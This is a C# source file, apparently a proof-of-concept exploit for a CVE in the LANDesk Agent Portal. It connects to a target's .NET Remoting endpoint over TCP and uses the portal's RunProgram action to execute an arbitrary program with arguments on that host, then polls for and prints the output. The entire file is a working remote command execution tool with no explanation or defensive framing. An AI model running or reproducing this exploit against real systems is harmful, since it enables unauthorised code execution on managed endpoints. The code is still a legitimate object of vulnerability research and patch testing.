using System;
using System.Runtime.Remoting.Channels;
using System.Runtime.Remoting.Channels.Tcp;
using System.Threading;
using LANDesk.AgentPortal;

namespace CVE
{
    internal class Program
    {
        public static void Main(string[] args)
        {
            TcpChannel channel = new TcpChannel();
            ChannelServices.RegisterChannel(channel, false);

            if (args.Length < 3)
            {
                Console.WriteLine("Usage: Program.exe <ip> <port> <program_to_execute> [arguments_for_program]");
                return;
            }

            var ip = args[0];
            var port = args[1];
            var command = args[2];
            string arguments = "";
            if (args.Length > 3)
            {
               arguments = string.Join(" ", args, 3, args.Length - 3);
            }

            string url = String.Format("tcp://{0}:{1}/LANDeskAgentPortal/LDSM", ip, port);
            IAgentPortal agentPortal = (IAgentPortal)Activator.GetObject(typeof(IAgentPortal), url);

            try
            {
                Console.WriteLine("Sending request.");
                bool request_result = agentPortal.Request("localhost", IAgentPortalBase.ActionEnum.RunProgram, command,  arguments);
                Console.WriteLine("Request result: " + request_result);
                
                string[] result = agentPortal.GetResult("localhost");
                while (result == null)
                {
                    Console.WriteLine("Waiting for result.");
                    result = agentPortal.GetResult("localhost");
                    Thread.Sleep(1000);
                }
                Console.WriteLine("Result: " + string.Join("\n", result));

            }
            catch (Exception e)
            {
                Console.WriteLine(e);
            }
        }
    }
}